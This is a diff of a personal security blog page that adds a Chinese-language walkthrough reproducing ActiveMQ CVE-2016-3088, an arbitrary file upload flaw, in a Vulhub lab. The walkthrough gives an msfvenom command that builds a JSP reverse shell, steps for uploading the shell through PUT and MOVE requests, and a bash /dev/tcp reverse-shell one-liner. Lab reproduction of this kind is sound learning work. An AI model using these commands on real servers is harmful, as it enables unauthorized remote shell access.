@@ -71,6 +71,63 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-vulhub-ActiveMQ-cve-2016-3088" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/11/28/vulhub-ActiveMQ-cve-2016-3088/" class="article-date">
+  <time class="dt-published" datetime="2021-11-28T10:57:13.000Z" itemprop="datePublished">2021-11-28</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Vulhub%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Vulhub漏洞复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/11/28/vulhub-ActiveMQ-cve-2016-3088/">vulhub-ActiveMQ-cve-2016-3088</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>简单对ActiveMQ-cve-2016-3088任意文件上传漏洞进行一个复现。</p>
+<p>懂得都懂。</p>
+<h2 id="第一步：环境准备"><a href="#第一步：环境准备" class="headerlink" title="第一步：环境准备"></a>第一步：环境准备</h2><h4 id="1-1-在vulhub上开启ActiveMQ-CVE-2016-3088环境。这里不多做赘述。"><a href="#1-1-在vulhub上开启ActiveMQ-CVE-2016-3088环境。这里不多做赘述。" class="headerlink" title="1.1  在vulhub上开启ActiveMQ_CVE-2016-3088环境。这里不多做赘述。"></a>1.1  在vulhub上开启ActiveMQ_CVE-2016-3088环境。这里不多做赘述。</h4><h2 id="第二步：漏洞利用"><a href="#第二步：漏洞利用" class="headerlink" title="第二步：漏洞利用"></a>第二步：漏洞利用</h2><h4 id="1-1-在攻击机器kali上制作jsp反弹shell。"><a href="#1-1-在攻击机器kali上制作jsp反弹shell。" class="headerlink" title="1.1 在攻击机器kali上制作jsp反弹shell。"></a>1.1 在攻击机器kali上制作jsp反弹shell。</h4><p>​        <strong>输入如下：</strong></p>
+<p>​        <strong>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.xx.xx(这里填写攻击机器ip) LPORT=8888 -f  raw &gt; shell.jsp</strong></p>
+<h4 id="1-2-之后利用burpsuite抓取8161端口的包，修改包http的方法为put并且将上述shell-jsp里面的内容粘贴到里面，如下图："><a href="#1-2-之后利用burpsuite抓取8161端口的包，修改包http的方法为put并且将上述shell-jsp里面的内容粘贴到里面，如下图：" class="headerlink" title="1.2 之后利用burpsuite抓取8161端口的包，修改包http的方法为put并且将上述shell.jsp里面的内容粘贴到里面，如下图："></a><strong>1.2 之后利用burpsuite抓取8161</strong>端口的包，修改包http的方法为put并且将上述shell.jsp里面的内容粘贴到里面，如下图：</h4><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oucGIe"><img src="https://z3.ax1x.com/2021/11/28/oucGIe.jpg" alt="oucGIe.jpg"></a></p>
+<h4 id="1-3-使用move方法移动到可执行目录之前，先确定可上传的执行文件路径。"><a href="#1-3-使用move方法移动到可执行目录之前，先确定可上传的执行文件路径。" class="headerlink" title="1.3 使用move方法移动到可执行目录之前，先确定可上传的执行文件路径。"></a>1.3 使用move方法移动到可执行目录之前，先确定可上传的执行文件路径。</h4><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/ougIXt"><img src="https://z3.ax1x.com/2021/11/28/ougIXt.jpg" alt="ougIXt.jpg"></a></p>
+<p>确定可上传路径为/opt/activemq/webapps/api/。</p>
+<h4 id="1-4-移动文件"><a href="#1-4-移动文件" class="headerlink" title="1.4  移动文件"></a>1.4  移动文件</h4><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/ou2C7T"><img src="https://z3.ax1x.com/2021/11/28/ou2C7T.jpg" alt="ou2C7T.jpg"></a></p>
+<h4 id="1-5-在攻击机器开启监听8888端口，访问http-yourip-8186-api，可以看到上传的s-jsp文件。"><a href="#1-5-在攻击机器开启监听8888端口，访问http-yourip-8186-api，可以看到上传的s-jsp文件。" class="headerlink" title="1.5 在攻击机器开启监听8888端口，访问http://yourip:8186/api，可以看到上传的s.jsp文件。"></a>1.5 在攻击机器开启监听8888端口，访问<a target="_blank" rel="noopener" href="http://yourip:8186/api%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E4%B8%8A%E4%BC%A0%E7%9A%84s.jsp%E6%96%87%E4%BB%B6%E3%80%82">http://yourip:8186/api，可以看到上传的s.jsp文件。</a></h4><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/ou2YjI"><img src="https://z3.ax1x.com/2021/11/28/ou2YjI.jpg" alt="ou2YjI.jpg"></a></p>
+<h4 id="1-6-点击s-jsp，攻击机收到了反弹shell。"><a href="#1-6-点击s-jsp，攻击机收到了反弹shell。" class="headerlink" title="1.6 点击s.jsp，攻击机收到了反弹shell。"></a>1.6 点击s.jsp，攻击机收到了反弹shell。</h4><h4 id=""><a href="#" class="headerlink" title=""></a><a target="_blank" rel="noopener" href="https://imgtu.com/i/ou2s3j"><img src="https://z3.ax1x.com/2021/11/28/ou2s3j.jpg" alt="ou2s3j.jpg"></a></h4><h4 id="1-7-输入bash-i-gt-amp-dev-tcp-192-168-xx-xx-443-0-gt-amp-1再次反弹回交互式shell。"><a href="#1-7-输入bash-i-gt-amp-dev-tcp-192-168-xx-xx-443-0-gt-amp-1再次反弹回交互式shell。" class="headerlink" title="1.7 输入bash -i &gt;&amp; /dev/tcp/192.168.xx.xx/443 0&gt;&amp;1再次反弹回交互式shell。"></a>1.7 输入bash -i &gt;&amp; /dev/tcp/192.168.xx.xx/443 0&gt;&amp;1再次反弹回交互式shell。</h4><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/ou2o8J"><img src="https://z3.ax1x.com/2021/11/28/ou2o8J.jpg" alt="ou2o8J.jpg"></a></p>
+<h1 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02 结语"></a>0x02 结语</h1><p>文章作者**:** cloudroam7</p>
+<p><strong>文章链接</strong>：<a target="_blank" rel="noopener" href="http://localhost:4000/2021/11/27/vulhub-ActiveMQ-cve-2015-5254/">http://localhost:4000/2021/11/27/vulhub-ActiveMQ-cve-2015-5254/</a></p>
+<p><strong>版权声明:</strong> 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 (<a target="_blank" rel="noopener" href="https://cloudroam7.github.io/)%EF%BC%81">https://cloudroam7.github.io/)！</a></p>
+<h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/11/28/vulhub-ActiveMQ-cve-2016-3088/" data-id="ckwj7iers000058uggslf7sat" data-title="vulhub-ActiveMQ-cve-2016-3088" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulhub-ActiveMQ-2016-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag">Vulhub_ActiveMQ_2016_任意文件上传漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-vulhub-ActiveMQ-cve-2015-5254" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/11/27/vulhub-ActiveMQ-cve-2015-5254/" class="article-date">
@@ -97,7 +154,7 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>简单对ActiveMQ-cve-2015-5254漏洞进行一个复现。</p>
+        <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>简单对ActiveMQ-cve-2015-5254反序列化漏洞进行一个复现。</p>
 <p>懂得都懂。</p>
 <h2 id="第一步：环境准备"><a href="#第一步：环境准备" class="headerlink" title="第一步：环境准备"></a>第一步：环境准备</h2><h4 id="1-1-在vulhub上开启ActiveMQ-CVE-2015-5254环境。"><a href="#1-1-在vulhub上开启ActiveMQ-CVE-2015-5254环境。" class="headerlink" title="1.1  在vulhub上开启ActiveMQ_CVE-2015-5254环境。"></a>1.1  在vulhub上开启ActiveMQ_CVE-2015-5254环境。</h4><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/omYoyn"><img src="https://z3.ax1x.com/2021/11/27/omYoyn.png" alt="omYoyn.png"></a></p>
 <h4 id="1-2-浏览器访问ip-自己本地ip-61616。"><a href="#1-2-浏览器访问ip-自己本地ip-61616。" class="headerlink" title="1.2 浏览器访问ip(自己本地ip):61616。"></a>1.2 浏览器访问ip(自己本地ip):61616。</h4><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/omUSVx"><img src="https://z3.ax1x.com/2021/11/27/omUSVx.png" alt="omUSVx.png"></a></p>
@@ -119,17 +176,18 @@
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/JakeLinfly/article/details/106853964">https://blog.csdn.net/JakeLinfly/article/details/106853964</a></p>
 <p>2、获取jmet</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2015-5254">https://github.com/jas502n/CVE-2015-5254</a></p>
-<p>文章作者:** cloudroam7</p>
+<p><strong>文章作者</strong>:** cloudroam7</p>
+<p><strong>文章链接</strong>：<a target="_blank" rel="noopener" href="https://cloudroam7.github.io/2021/11/27/vulhub-ActiveMQ-cve-2015-5254/">https://cloudroam7.github.io/2021/11/27/vulhub-ActiveMQ-cve-2015-5254/</a></p>
 <p><strong>版权声明:</strong> 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 (<a target="_blank" rel="noopener" href="https://cloudroam7.github.io/)%EF%BC%81">https://cloudroam7.github.io/)！</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/27/vulhub-ActiveMQ-cve-2015-5254/" data-id="ckwhucbpa0000wwug9am3gwvs" data-title="vulhub_ActiveMQ-cve-2015-5254" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/11/27/vulhub-ActiveMQ-cve-2015-5254/" data-id="ckwhqus730000wcug6b3w74ly" data-title="vulhub_ActiveMQ-cve-2015-5254" class="article-share-link">Share</a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulhub-ActiveMQ/" rel="tag">Vulhub_ActiveMQ</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulhub-ActiveMQ-2015-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="tag">Vulhub_ActiveMQ_2015_反序列化漏洞</a></li></ul>
 
     </footer>
   </div>
@@ -401,7 +459,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Penetration-test/" rel="tag">Penetration test</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vulhub-ActiveMQ/" rel="tag">Vulhub_ActiveMQ</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Penetration-test/" rel="tag">Penetration test</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vulhub-ActiveMQ-2015-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="tag">Vulhub_ActiveMQ_2015_反序列化漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vulhub-ActiveMQ-2016-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag">Vulhub_ActiveMQ_2016_任意文件上传漏洞</a></li></ul>
     </div>
   </div>
 
@@ -411,7 +469,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Penetration-test/" style="font-size: 10px;">Penetration test</a> <a href="/tags/Vulhub-ActiveMQ/" style="font-size: 10px;">Vulhub_ActiveMQ</a>
+      <a href="/tags/Penetration-test/" style="font-size: 10px;">Penetration test</a> <a href="/tags/Vulhub-ActiveMQ-2015-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">Vulhub_ActiveMQ_2015_反序列化漏洞</a> <a href="/tags/Vulhub-ActiveMQ-2016-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">Vulhub_ActiveMQ_2016_任意文件上传漏洞</a>
     </div>
   </div>
 
@@ -431,6 +489,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/11/28/vulhub-ActiveMQ-cve-2016-3088/">vulhub-ActiveMQ-cve-2016-3088</a>
+          </li>
         
           <li>
             <a href="/2021/11/27/vulhub-ActiveMQ-cve-2015-5254/">vulhub_ActiveMQ-cve-2015-5254</a>
